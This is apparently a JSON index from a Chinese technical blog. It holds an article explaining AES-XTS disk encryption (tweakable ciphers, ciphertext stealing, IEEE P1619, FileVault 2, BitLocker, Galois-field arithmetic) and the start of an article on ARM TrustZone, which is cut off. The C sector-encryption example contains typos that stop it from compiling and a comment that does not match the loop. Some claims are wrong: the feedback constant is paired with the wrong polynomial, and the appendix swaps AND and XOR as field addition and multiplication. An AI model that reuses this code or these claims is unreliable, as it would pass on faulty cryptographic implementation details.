[{"title":"AES-XTS 磁盘加密模式的技术分析","url":"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>AES-XTS 的设计目标是解决磁盘文件的加密存储需求。<br>ECB 模式存在明文攻击问题，磁盘文件中经常存在内容相同的分组，显然不适用。其他分组密码工作模式也有两个难题无法解决，一是如何存储初始向量IV，二是如何支持随机存取。</p>\n<p>CBC、CFB 和 OFB 模式都需要初始向量，因此每个文件都需要额外的空间用于存储 IV，不仅增加磁盘开销，而且破坏了明文和密文在扇区存储上的对应关系，给底层技术实现带来了很大麻烦。</p>\n<p>CBC、CFB 和 OFB 模式的分组之间存在依赖关系，不能实现完全的并行计算（CBC、CFB 模式仅支持解密的并行计算，并需要额外读取上一个分组的密文；OFB 模式完全不支持并行计算），因此即使仅仅修改磁盘文件的个别字节，也需要重新加密整个文件，严重影响了处理效率。</p>\n<p>相对而言，CTR 模式较为友好，通过提前预处理流密钥，可以支持加密和解密的并行计算。但是，CTR 模式同样需要独立的计数器，无法解决额外存储的问题。</p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>AES-XTS 的全称：XEX-based Tweaked-codebook mode with ciphertext Stealing。</p>\n<ul>\n<li>基于XEX，XOR-ENCRYPT-XOR</li>\n<li>支持密文窃取算法，ciphertext Stealing</li>\n<li>可调整的密码本模式，Tweaked-codebook</li>\n</ul>\n<p>白化（Whitening）是 AES-XTS 的重要技术基础，最早出现是 Ronald L.Rivest 发明的 DES-X。<br>DES 通常使用的密钥是56位，为了增加迭代分组加密安全性，DES-X 使用了两个64位的密钥，在第一轮加密和最后一轮对密钥和明文进行异或操作，攻击者若不知道密钥，则无法进行第一个加密解密操作，这样就在不改变算法的前提下，即可增加密钥的有效长度，以增强暴力破解的复杂度。</p>\n<blockquote>\n<p>Ronald L.Rivest 就是 RSA 中的 R ！美国麻省理工学院教授，2002年图灵奖得主之一。</p>\n</blockquote>\n<p>2002年，Moses Liskov，Ronald L.Rivest, David Wagner 首次提出了<a href=\"https://people.csail.mit.edu/rivest/pubs/LRW02.pdf\">可调整的分组密码</a>，跟传统的分组密码相比，除了密匙和明文这两个输入外，还引入一个新输入—可调整值 tweak，其优势在于：</p>\n<ol>\n<li>在不更改分组密钥的情况下，仅仅改变 tweak value 就可以给加密系统提供多变性，tweak value 是公开的，即使被泄露，仍然需要分组密钥才能解密；</li>\n<li>tweak value 可以设置为与区块的 index 成对应关系，不再需要存储额外的初始向量，也就避免了明文和密文在扇区上的存储不对应的问题；</li>\n<li>各个区块数据的加密解密互相独立（tweak key 各不相同），不存在依赖关系，加密和解密都可以完全并行化。</li>\n</ol>\n<p>2007年，IEEE 组织发布了<a href=\"https://luca-giuzzi.unibs.it/corsi/Support/papers-cryptography/1619-2007-NIST-Submission.pdf\">IEEE std 1619-2007</a> ，提供 XTS-AES 算法用于以数据单元（包括扇区、逻辑磁盘块等）为基础结构的存储设备中静止状态数据的加密，SISWG（存储安全工作组，Security in Storage Working Group）负责维护该标准。</p>\n<p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/XTS_mode_encryption.png\" alt=\"total\"></p>\n<p>2010年，美国密码局也接纳了该标准，并命名为<a href=\"https://csrc.nist.gov/pubs/sp/800/38/e/final\">NIST SP800-38E</a>。</p>\n<h2 id=\"二、基本流程\"><a href=\"#二、基本流程\" class=\"headerlink\" title=\"二、基本流程\"></a>二、基本流程</h2><h3 id=\"1-单一分组的处理方式\"><a href=\"#1-单一分组的处理方式\" class=\"headerlink\" title=\"1. 单一分组的处理方式\"></a>1. 单一分组的处理方式</h3><p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/enc-dec.png\" alt=\"vs\"></p>\n<h4 id=\"加密算法：-C-XTS-AES-blockEnc-Key-P-i-j\"><a href=\"#加密算法：-C-XTS-AES-blockEnc-Key-P-i-j\" class=\"headerlink\" title=\"加密算法：$C &#x3D; XTS-AES-blockEnc(Key, P, i, j)$\"></a>加密算法：$C &#x3D; XTS-AES-blockEnc(Key, P, i, j)$</h4><p>输入参数为：</p>\n<ul>\n<li>$Key$：一个加密密钥，均等分为两个部分，key2 就是 tweak key，key1 用于明文的分组加密</li>\n<li>$P$：一个128位的明文块，也就是16个字节</li>\n<li>$i$：一个128位的 tweak value，通常是磁盘扇区的序号</li>\n<li>$j$：该明文块在该数据单元（扇区）中的分组序列号，以16个字节为单位</li>\n</ul>\n<p>输出结果是：</p>\n<ul>\n<li>$C$：这个块加密后的密文</li>\n</ul>\n<p>处理逻辑为：<br>$T &#x3D; AES-enc(key_2, i) \\bigotimes \\alpha^j$<br>$C &#x3D; AES-enc(key_1, P \\bigoplus T) \\bigoplus T$</p>\n<h4 id=\"解密算法：-C-XTS-AES-blockDec-Key-C-i-j\"><a href=\"#解密算法：-C-XTS-AES-blockDec-Key-C-i-j\" class=\"headerlink\" title=\"解密算法：$C &#x3D; XTS-AES-blockDec(Key, C, i, j)$\"></a>解密算法：$C &#x3D; XTS-AES-blockDec(Key, C, i, j)$</h4><p>输入参数、输出结果的结构与加密算法保持一致，只是 C 和 P 换了位置。</p>\n<p>处理逻辑为：<br>$T &#x3D; AES-enc(key_2, i) \\bigotimes \\alpha^j$<br>$P &#x3D; AES-dec(key_1, C \\bigoplus T) \\bigoplus T$</p>\n<h3 id=\"2-密文窃取的处理方式\"><a href=\"#2-密文窃取的处理方式\" class=\"headerlink\" title=\"2. 密文窃取的处理方式\"></a>2. 密文窃取的处理方式</h3><p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/enc-dec-last2.png\" alt=\"2\"></p>\n<h4 id=\"加密算法\"><a href=\"#加密算法\" class=\"headerlink\" title=\"加密算法\"></a>加密算法</h4><ul>\n<li>明文$P_{m-1}$执行 AES-enc，密文结果 $C$ 的前 i 个字节作为$C_{m-1}$</li>\n<li>（明文$P_m$的不完整分组 + <strong>窃取</strong>$C$的剩余字节），执行 AES-enc 得到$C_m$</li>\n</ul>\n<h4 id=\"解密算法\"><a href=\"#解密算法\" class=\"headerlink\" title=\"解密算法\"></a>解密算法</h4><ul>\n<li>对密文$C_{m-1}$执行 AES-dec，明文结果 P 的前 i 个字节作为$P_m$</li>\n<li>（密文$C_m$的不完整分组 + <strong>窃取</strong>$P$的剩余字节），执行 AES-dec 得到$P_{m-1}$</li>\n</ul>\n<p>通过密文窃取方式，AES-XTS 保持了明文和密文长度的一致性，不会造成存储空间的浪费，代价是需要缓存最后2个数据分组。</p>\n<h2 id=\"三、代码示例\"><a href=\"#三、代码示例\" class=\"headerlink\" title=\"三、代码示例\"></a>三、代码示例</h2><p>AES-XTS 的硬件实现很方便，有限域的乘法就是一个 LSFR（线性移位反馈寄存器）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> GF_128_FDBK     0x87                <span class=\"comment\">// 设定本原生成式 = x^4 + x^2 + x + 1，FDBK=feedback</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AES_BLK_BYTES   16                  <span class=\"comment\">// 1 byte = 8 bits, 128位 = 16个字节</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">XTS_EncryptSector</span><span class=\"params\">( AES_Key &amp;k2,       <span class=\"comment\">// tweak 可调整密钥 </span></span></span><br><span class=\"line\"><span class=\"params\">                        AES_Key &amp;k1,       <span class=\"comment\">// ECB 主密钥</span></span></span><br><span class=\"line\"><span class=\"params\">                        u64b    S,         <span class=\"comment\">// 扇区sector的序号，最长64位</span></span></span><br><span class=\"line\"><span class=\"params\">                        uint    N,         <span class=\"comment\">// 扇区sectot的长度，按字节计算</span></span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"type\">const</span>   u08b *pt,  <span class=\"comment\">// 明文，输入，const声明防止被修改</span></span></span><br><span class=\"line\"><span class=\"params\">                        u08b    *ct )</span>      <span class=\"comment\">// 密文，输出，地址传参</span></span><br><span class=\"line\">&#123;                                          </span><br><span class=\"line\">    uint    i,j;</span><br><span class=\"line\">    u08b    T[AES_BLK_BYTES];               <span class=\"comment\">// tweak value， </span></span><br><span class=\"line\">    u08b    x[AES_BLK_BYTES];               <span class=\"comment\">// 临时工作变量</span></span><br><span class=\"line\">    u08b    Cin, Cout;                      <span class=\"comment\">// LSFR 的携位信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">    assert(N &gt;= AES_BLK_BYTES == <span class=\"number\">0</span>);         <span class=\"comment\">// 断言：确认至少有一个完整分组</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将扇区序号作为 i，导入tweak value；注意需调整为小端字节序：123456789a-&gt;9a78563412</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++&gt;) &#123;  </span><br><span class=\"line\">        T[j] = (u08b) (S &amp; <span class=\"number\">0xFF</span>);           </span><br><span class=\"line\">        S = S &gt;&gt; <span class=\"number\">8</span>;                         <span class=\"comment\">// S 是64位，高8个字节实际填充0；物理限制2^128，建议2^20</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 基于 tweakl key 加密，完成 T 的初始化</span></span><br><span class=\"line\">    AES_ECB_Encrypt(k2, T);                 T</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 每次处理16字节的分组，i 记录当前扇区的处理位置，注意循环结束在倒数第二个分组！</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i+AES_BLK_BYTES &lt;= N; i += AES_BLK_BYTES) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 明文 pt 和 T 的第一轮XOR</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++)</span><br><span class=\"line\">            x[j] = pt[i+j] ^ T[j];          </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 基于主密钥完成加密</span></span><br><span class=\"line\">        AES_ECB_Encrypt(k1, x);             </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 明文 pt 和 T 的第二轮XOR，ct 作为密文结果输出</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++) </span><br><span class=\"line\">            ct[i+j] = x[j] ^ T[j];         </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 基于GF(2^128)乘法，LSFR 为下一循环构造 T，包含移位和反馈两个步骤</span></span><br><span class=\"line\">        <span class=\"comment\">// 移位步骤：T 的16个字节依次左移1位，末位补0。不能简单的整体左移1位！因为是小端字节序</span></span><br><span class=\"line\">        Cin = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++) &#123;   </span><br><span class=\"line\">            Cout = (T[j] &gt;&gt; <span class=\"number\">7</span> ) &amp; <span class=\"number\">1</span>;            <span class=\"comment\">// 第j个字节的最高位溢出，暂存Cout</span></span><br><span class=\"line\">            T[j] = ((T[j] &lt;&lt; <span class=\"number\">1</span>) + Cin) &amp; <span class=\"number\">0xFF</span>;  <span class=\"comment\">// 当前字节左移1位，末位填充上个字节的溢出位</span></span><br><span class=\"line\">            Cin = Cout;                         <span class=\"comment\">// 为下个字节准备溢出位</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 反馈步骤：如果T最高位溢出的比特为1，则最低位字节 XOR (1000 0111)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Cout)                           </span><br><span class=\"line\">            T[<span class=\"number\">0</span>] ^= GF_128_FDBK;                <span class=\"comment\">// 本原生成式的最高位x^4，T[0]就够用</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果 i == N，说明没有不完整分组，无需处理；否则，对最后一个不完整扇区进行密文窃取</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &lt; N) &#123;   </span><br><span class=\"line\">        <span class=\"comment\">// 明文 pt 和 T 的第一轮XOR                         </span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>; i+j&lt;N; j++) &#123;</span><br><span class=\"line\">            x[j] = pt[i+j] ^ T[j];              <span class=\"comment\">// x[0..z-1]：仅处理明文的剩余 z 个字节 </span></span><br><span class=\"line\">            ct[i+j] = ct[i+j-AES_BLK_BYTES];    <span class=\"comment\">// 保存上一分组密文的前 z 个字节，并追加到密文输出的尾部</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (; j&lt;AES_BLK_BYTES; j++)            <span class=\"comment\">// 注意！j 开始于上个循环的结束位置 m-1 ！</span></span><br><span class=\"line\">            x[j] = ct[i+j-AES_BLK_BYTES];       <span class=\"comment\">// x[z,15]：窃取上一轮密文的后 16-z 个字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 基于主密钥完成加密</span></span><br><span class=\"line\">        AES_ECB_Encrypt(k1, x);                 </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 填充窃取数据的明文 pt 和 T 的第二轮XOR，ct 作为密文结果输出</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>; j&lt;AES_BLK_BYTES; j++)</span><br><span class=\"line\">            ct[i+j-AES_BLK_BYTES] =x[j] ^ T[j]; </span><br><span class=\"line\">    &#125;                                </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、后续演进\"><a href=\"#四、后续演进\" class=\"headerlink\" title=\"四、后续演进\"></a>四、后续演进</h2><h3 id=\"1-P1619-1\"><a href=\"#1-P1619-1\" class=\"headerlink\" title=\"1. P1619.1\"></a>1. P1619.1</h3><p>IEEE 1619 定义的 AES-XTS 仅提供机密性保护的能力，并不包含完整性保护和身份认证的能力。<br>AES-XTS 可能被攻击者改写数据而不表现出异常（选择密文攻击），也无法抵御流量分析和重放攻击，请参见 <a href=\"https://crypto.stackexchange.com/questions/5587/what-is-the-advantage-of-xts-over-cbc-mode-with-diffuser\">Compare Blockmode CBC (with diffuser) against XTS</a>。</p>\n<p>P1619.1 定义了若干附加身份认证的加密算法，用于支持长度扩展的存储设备，包括：</p>\n<ul>\n<li>Counter mode with CBC-MAC (CCM)</li>\n<li>Galois&#x2F;Counter Mode (GCM)</li>\n<li>Cipher Block Chaining (CBC) with HMAC-Secure Hash Algorithm</li>\n<li>XTS-HMAC-Secure Hash Algorithm</li>\n</ul>\n<h3 id=\"2-P1619-2\"><a href=\"#2-P1619-2\" class=\"headerlink\" title=\"2. P1619.2\"></a>2. P1619.2</h3><p>AES-XTS 也被称为窄块加密算法（Narrow-block encryption），其特点是一个扇区被分成多个分组进行加密处理（AES-128 将 512 字节的标准扇区分为 32 个block），突出优势是硬件实现的效率高，但也存在某些安全隐患，例如较小的分组长度为数据修改攻击提供了便利条件。</p>\n<p>对应的，宽块加密算法（wide-block encryption）以一个完整的扇区为单位（通常为 512 个字节）进行加密处理，P1619.2 为此定了若干算法：</p>\n<ul>\n<li>XCB：<a href=\"https://eprint.iacr.org/2004/278.pdf\">the Extended Codebook (XCB) Mode of Operation</a></li>\n<li>EME2：Encrypt Mix Encrypt V2 Advanced Encryption Standard</li>\n</ul>\n<h3 id=\"3-P1619-3\"><a href=\"#3-P1619-3\" class=\"headerlink\" title=\"3. P1619.3\"></a>3. P1619.3</h3><p>定义了一套密钥管理的基础架构，包括体系结构、命名空间、操作、消息传递和传输。</p>\n<h2 id=\"五、产品实现\"><a href=\"#五、产品实现\" class=\"headerlink\" title=\"五、产品实现\"></a>五、产品实现</h2><h3 id=\"1-Mac-OS-X-Lion’s-FileVault-2\"><a href=\"#1-Mac-OS-X-Lion’s-FileVault-2\" class=\"headerlink\" title=\"1. Mac OS X Lion’s FileVault 2\"></a>1. Mac OS X Lion’s FileVault 2</h3><p>FileVault 是 MacOS 提供的 FDE（Full Disk Encryption，全盘加密）产品，DataProtection 是 Mac iOS 提供的 FBE（File Based Encryption，文件加密）产品，虽然适配不同类型的设备，但都遵循 AES-XTS 标准，满足如下技术要求：</p>\n<ul>\n<li>密⽂文应该与明⽂⼤小相同，从⽽不改变数据的布局</li>\n<li>数据分组可单独访问，且相互独⽴</li>\n<li>加密分组⼤小为16字节</li>\n<li>不使⽤其他元数据（除了数据分组的位置）</li>\n<li>不同位置 相同明⽂ &#x3D;&#x3D;》密⽂不不同</li>\n<li>符合标准的加解密设备可以相互通⽤</li>\n</ul>\n<p>Apple 安全白皮书中有一些关于 AES-XTS 的描述，例如：</p>\n<ul>\n<li>Mac 电脑会提供文件保险箱，这是一项内建加密功能，用于保护所有静态数据安全。文件保险箱使用 AES-XTS 数据加密算法保护内部和可移除储存设备上的完整宗卷。</li>\n<li>FileValut 构建的密钥层级需要满足四个目标，其中之一就是：<strong>让用户无需重新加密整个宗卷即可更改其密码 （同时也会更改用于保护其文件的加密密钥）</strong>。</li>\n<li>每次在数据宗卷中创建文件时，数据保护都会创建一个新的 256 位密钥 （文件独有密钥），并将其提供给硬件 AES 引擎， 此引擎会使用该密钥在文件写入闪存时对其进行加密。</li>\n<li>采用 A9 到 A13、 S5 和 S6 的每一代硬件在 XTS 模式中使用 AES-128， 其中 256 位文件独有密钥会被拆分， 以提供一个 128 位tweak 密钥和一个 128 位 cipher 密钥。</li>\n<li>搭载 A14 和 M1 的设备上，加密模式升级为 AES-256，密钥派生算法基于 NIST Special Publication 800-108。</li>\n</ul>\n<p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/filevault2.png\" alt=\"arch\"><br>根据<a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FileVault Drive Encryption (FVDE)</a>的描述，其AES-XTS协议的实现方式是：</p>\n<ul>\n<li>primary key（key1）：源自于 Volume Master Key (VMK)，128位</li>\n<li>tweak key（key2）: 源自于 logical volume family identifier，128位</li>\n<li>tweak value：源自于磁盘扇区序号，以 512 字节为单位</li>\n</ul>\n<p>执行命令<code>diskutil coreStorage info</code>可以查看 logical volume family identifier，或者检索系统变量<code>com.apple.corestorage.lv.familyUUID</code>，这充分体现了 twaek key 的可公开性。</p>\n<blockquote>\n<p>国内某公司提供了完整的技术方案，参见<a href=\"FileVault2%E5%8A%A0%E5%AF%86%E5%88%86%E5%8C%BA%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%85%B6%E5%8F%96%E8%AF%81%E5%BA%94%E7%94%A8_%E8%93%9D%E6%9C%9D%E7%A5%A5.pdf\">FileVault2加密分区的解密技术</a>。</p>\n</blockquote>\n<h3 id=\"2-Windows-Vista-BitLocker\"><a href=\"#2-Windows-Vista-BitLocker\" class=\"headerlink\" title=\"2. Windows Vista BitLocker\"></a>2. Windows Vista BitLocker</h3><p>微软开发的 Windows Vista BitLocker 采用的 AES-CBC+Elephant diffuser 是一种宽块加密模式，加密粒度是一个扇区，工作原理如下：</p>\n<ol>\n<li>$K &#x3D; K_1 | K_2$</li>\n<li>$PP &#x3D; P \\oplus K_1$</li>\n<li>PP 经过 2 个 diffuser 算法的作用后，使用 CBC 模式进行加密。<br> 其中，每个扇区的 $IV &#x3D; E_{K_2}(e(sector))$<br> sector为扇区号，$e()$将扇区号映射为一个唯一的 16 字节的 value。</li>\n</ol>\n<p>微软已经证明了使用扩散体(diffuser)后的 CBC 比原来的 CBC 更难攻击，</p>\n<h2 id=\"六、技术分析\"><a href=\"#六、技术分析\" class=\"headerlink\" title=\"六、技术分析\"></a>六、技术分析</h2><p>做个简要的总结分析：</p>\n<ol>\n<li>tweak key 是一种密码白化技术，其设计目标是：在无需扩展基础分组密钥的前提下，增加基于 XEX 模式的 tweak key 提供更高的加密强度。</li>\n<li>在<strong>确保伪随机性</strong>的前提下，用户可以自行选择并公开 tweak key 的加密（轮转）算法，无需与基础的分组密码算法保持一致。</li>\n<li>每轮次的$T &#x3D; Enc(key_2, i) \\bigotimes \\alpha^j$，加密因子的定义基于磁盘存储特征，不需要额外存储：<br> key2：基于 volume 的确定值，操作系统自行定义并公开，满足互操作性要求<br> i：基于 sector 的序列号提供随机性，为抵抗哈希碰撞攻击，建议小于$2^{40}$，即 PB 级别<br> j：基于 block 的序列号提供随机性，AES-128 将 512 字节的标准扇区分为 32 个分组</li>\n<li>T 是一个流密码，加密和解密算法是同质的；密钥轮转是基于$GF(2^{128})$的 j 阶乘法，既确保提供伪随机性，又充分利用有限域的元素空间。</li>\n<li>除了密文窃取方式需要缓存最后 2 个分组，各个分组之间不存在依赖关系，支持并行处理。</li>\n</ol>\n<p>还有一些遗留问题：</p>\n<h3 id=\"1-AES-XTS-如何加密小文件？\"><a href=\"#1-AES-XTS-如何加密小文件？\" class=\"headerlink\" title=\"1. AES-XTS 如何加密小文件？\"></a>1. AES-XTS 如何加密小文件？</h3><p>IEEE 1619 明确指出 AES-XTS 不支持小于一个分组的明文长度，如 AES-128-XTS 加密文件不得少于16个字节，那么小文件如何加密呢？<br>一种可能的方案是，采用类似 PKCS#7 的填充技术（文心一言的回答！），但结果是明文和密文的长度不一致，不利于磁盘管理。<br>另一种方案是，改用 ECB 工作模式，但解决明文攻击的问题如何解决呢？</p>\n<h3 id=\"2-如果更改-tweak-key-会发生什么？\"><a href=\"#2-如果更改-tweak-key-会发生什么？\" class=\"headerlink\" title=\"2. 如果更改 tweak key 会发生什么？\"></a>2. 如果更改 tweak key 会发生什么？</h3><p>IEEE 文档已给出明确表述：</p>\n<ul>\n<li>具有相同调整值的相同明文（密文）将始终加密（解密）为相同的密文（明文）</li>\n<li>任何其他密文（明文）将被解密（加密）为随机值</li>\n</ul>\n<hr>\n<h2 id=\"附录：伽罗瓦域的乘法\"><a href=\"#附录：伽罗瓦域的乘法\" class=\"headerlink\" title=\"附录：伽罗瓦域的乘法\"></a>附录：伽罗瓦域的乘法</h2><h3 id=\"有限域\"><a href=\"#有限域\" class=\"headerlink\" title=\"有限域\"></a>有限域</h3><p>从群论的角度看，域是特殊的群，域有单位元e和逆元，而且加法和乘法上具有封闭性，即：对域中的元素进行加法或乘法运算后的结果仍然是域中的元素。</p>\n<blockquote>\n<p>注意！域上的乘法和加法不一定是我们平常使用的乘法和加法。考虑到二进制进位的影响，可以把 C 语言中的 AND 运算和 XOR 运算分别定义成加法和乘法。</p>\n</blockquote>\n<p>如果某个域的元素数量确定（而不是无限），则称为有限域，又叫伽罗瓦域(Galois field)，记作GF(p)，该命名是为纪念法国数学家 Evariste Galois。<br>有限域GF(p)包含 p 个元素（p必须是质数），分别是 0 到 p-1，例如GF(7)：{0,1,2,3,4,5,6}。</p>\n<p>很多情况下 GF(p) 是不够用的，比如在图像像素的色彩空间一般为RGB(红绿蓝)色彩空间，每种颜色的取值范围都是0~255，我们需要另外一种有限域，它应该有$2^8$个元素，记为$GF(2^8)$。</p>\n<h3 id=\"本原多项式\"><a href=\"#本原多项式\" class=\"headerlink\" title=\"本原多项式\"></a>本原多项式</h3><p>域中不可约多项式（primitive polynomial）是不能够进行因子分解的多项式，本原多项式是一种特殊的不可约多项式。当一个域上的本原多项式确定了，这个域上的运算也就确定了，本原多项式一般通过查表可得，同一个域往往有多个本原多项式。</p>\n<p>对于$GF(p^n)$来说，通常的加法运算与乘法运算往往不能构成一个域的，所以我们需要引进新的加法运算与乘法运算，即多项式乘法。通过将域中的元素化为多项式的形式，可以将域上的乘法运算转化为普通的多项式乘法模以本原多项式的计算。</p>\n<p>比如：$g(x) &#x3D; x^3+x+1$是$GF(2^3)$上的本原多项式，则域上元素$3 \\bigotimes 7$可以转化为多项式乘法：<br>$(x+1) * (x^2+x+1) $ mod g(x) &#x3D; ($x^3+1$) mod($x^3+x+1$) &#x3D; x<br>也就是 $3 \\bigotimes 7 &#x3D; 2$。需要注意的是，系数为 2 的整数倍会被约去。</p>\n<h3 id=\"LSFR\"><a href=\"#LSFR\" class=\"headerlink\" title=\"LSFR\"></a>LSFR</h3><p>无论是普通计算还是伽罗瓦域上运算，乘二计算是一种非常特殊的运算。普通计算在计算机上通过向高位的移位计算即可实现，伽罗瓦域上乘二也不复杂，一次移位和一次异或即可，并且2 是GF(28) 中的生成元。</p>\n<p>从多项式的角度来看，伽罗瓦域上乘二对应的是一个多项式乘以x，如果这个多项式最高指数没有超过本原多项式最高指数，那么相当于一次普通计算的乘二计算，如果结果最高指数等于本原多项式最高指数，那么需要将除去本原多项式最高项的其他项和结果进行异或，在硬件中要实现：$g(x) &#x3D; x^8+x^4+x^3+x^2+1$，即：<br>x7  ← x6 ← x5  ← x4 ← x3 ← x2  ← x1  ← x0<br>↓________________↑___↑___↑_________↑<br>这里x0到x7 分别代表域中一个数的比特位，每次乘二除最高位不移位，其余各位向高位移一位，最高位和指定位进行异或（由本原多项式决定）。不难知道最高位异或的那几位对应着本原多项式系数为1 的几项。</p>\n<p>用C 语言可以写成：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint8_t</span> c, cc;</span><br><span class=\"line\">cc = (c&lt;&lt;<span class=\"number\">1</span>) ^ ((c &amp; <span class=\"number\">0x80</span>) ? <span class=\"number\">0x1d</span> : <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>c&amp;0x80 可以判断数c 最高位是否为1，如果为1 则异或0x1d。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.zhihu.com/question/26452995\">XTS-AES模式主要是解决什么问题，是怎样解决的?</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Xor%E2%80%93encrypt%E2%80%93xor\">XEX - Wiki</a></li>\n<li><a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FileVault Drive Encryption (FVDE)</a></li>\n<li><a href=\"https://github.com/heisencoder/XTS-AES\">XTS-AES 参考代码实现 - Github</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/20279484\">OS X Disk Util Manual Basic</a></li>\n<li><a href=\"https://www.cnblogs.com/weijianlong/p/11947741.html\">线性反馈移位寄存器（LFSR）</a></li>\n<li><a href=\"FileVault2%E5%8A%A0%E5%AF%86%E5%88%86%E5%8C%BA%E7%A6%BB%E7%BA%BF%E8%A7%A3%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8F%8A%E5%85%B6%E5%8F%96%E8%AF%81%E5%BA%94%E7%94%A8_%E8%93%9D%E6%9C%9D%E7%A5%A5.pdf\">FileVault2加密分区离线解密技术及其取证应用_蓝朝祥</a></li>\n</ul>\n<h3 id=\"理论研究\"><a href=\"#理论研究\" class=\"headerlink\" title=\"理论研究\"></a>理论研究</h3><ul>\n<li><a href=\"https://link.springer.com/content/pdf/10.1007/s001459900025\">A Construction of a Cipher from a Single Pseudorandom Permutation</a></li>\n<li><a href=\"%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90.pdf\">磁盘加密模式分析</a></li>\n<li><a href=\"https://crossbowerbt.github.io/xts_mode_tweaking.html\">Tweaking Tweakable AES XTS Mode</a></li>\n<li><a href=\"http://blog.foool.net/2013/01/%E4%BC%BD%E7%BD%97%E7%93%A6%E5%9F%9F%E4%B8%8A%E7%9A%84%E4%B9%98%E6%B3%95/\">伽罗瓦域上的乘法</a></li>\n<li><a href=\"https://www.bilibili.com/read/cv2922069/\">另一种世界观——有限域</a></li>\n</ul>\n"},{"title":"ARM TrustZone的技术概述","url":"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"一、安全元件-SE（Secure-Element）\"><a href=\"#一、安全元件-SE（Secure-Element）\" class=\"headerlink\" title=\"一、安全元件 - SE（Secure Element）\"></a>一、安全元件 - SE（Secure Element）</h2><p>19世纪70年代就出现了安全元件Secure Element，其外在表现就是一块物理上独立的芯片卡，负责提供私密信息的安全存储、重要程序的安全执行等功能。</p>\n<p>按照Global Platform的定义，SE具有自己独立的执行环境和安全存储，采用安全协议与外部通讯，支持软件防篡改和硬件防篡改，其内部组件包含有：CPU、RAM、ROM、加密引擎、传感器等。<br><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/SE.png\" 